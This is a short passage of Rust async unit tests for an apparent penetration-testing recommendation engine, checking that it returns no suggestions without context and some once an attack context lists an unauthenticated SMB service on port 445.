    #[tokio::test]
    async fn test_recommendation_engine_creation() {
        let engine = RecommendationEngine::new();
        let recs = engine.get_recommendations().await;
        assert!(recs.is_empty()); // No context yet
    }

    #[tokio::test]
    async fn test_recommendation_with_context() {
        let engine = RecommendationEngine::new();

        let context = AttackContext {
            discovered_services: vec![ServiceInfo {
                name: "smb".to_string(),
                version: None,
                port: 445,
                protocol: "tcp".to_string(),
                banner: None,
                authentication_required: false,
            }],
            ..Default::default()
        };

        engine.update_context(context).await;
        let recs = engine.get_recommendations().await;
        assert!(!recs.is_empty());
    }
}
